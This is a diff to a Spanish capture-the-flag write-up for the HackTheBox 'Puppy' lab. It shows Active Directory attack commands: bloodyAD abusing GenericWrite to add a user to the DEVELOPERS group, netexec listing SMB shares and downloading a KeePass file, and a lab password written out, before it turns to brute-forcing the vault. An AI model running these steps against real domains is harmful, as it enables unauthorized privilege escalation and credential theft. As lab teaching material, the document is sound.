@@ -103,19 +103,24 @@ Una vez dentro de la web importaremos el `.zip`
 ```
 
 Para buscar a que grupo pertenecemos, en el buscador de **bloodHound** el usuario que nos facilitaron al principio `levis.james`
-Y en *Outbound Object Control* vemos que el usuario es miembro de `HR@PUPPY.HTB` que tiene capacidad de modificar y añadir atributos en otro grupo  a la vez es miembro del grupo `DEVELOPERS@PUPPY.HTB`  
+Y en *Outbound Object Control* vemos que el usuario es miembro de `HR@PUPPY.HTB` que tiene capacidad de modificar y añadir atributos en otro grupo del que es miembro en este caso del grupo `DEVELOPERS@PUPPY.HTB`  
 
-Añadimos usuario a grupo DEVELOPERS por que tenemos generic write
+
+Sabiendo que tenemos esos "privilegios" añadimos el usuario al grupo **DEVELOPERS**
 `bloodyAD --host $IP -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'`
 
-Como nos hemos vovemos a acceder al smb y vemos que tenmos acceso a DEV
-`nxc smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares `
+Como nos hemos añadido al grupo **DEVELOPERS** volvemos a acceder al **SMB** y tendremos acceso a la carpeta compartida **DEV**
+`netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares `
 
-Nos encontramos que en el directorio hay un archivo con extensión de keepass `kdbx` 
+Nos encontramos que en el directorio hay un archivo con extensión de *keepass* `kdbx` 
 `recovery.kdbx`
 
-Nos descargamos el archivo 
-`nxc smb $IP -u 'levi.james' -p 'KingofAkron2025!' --share 'DEV' --get-file 'recovery.kdbx' 'recovery.kdbx'`
+```ad-info
+KeePass es un **gestor de contraseñas de código abierto y gratuito** que te ayuda a **almacenar de forma segura** tus nombres de usuario, contraseñas y otros datos sensibles.
+```
+
+Nos descargamos el archivo que hemos encontrado con [[CRACKMAPEXEC-NETEXEC]]
+`netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --share 'DEV' --get-file 'recovery.kdbx' 'recovery.kdbx'`
 
 Lo añadimos a Keepassxc el archivo y nos pide una passwd
 como no la tenemos la hacemos fuerza bruta
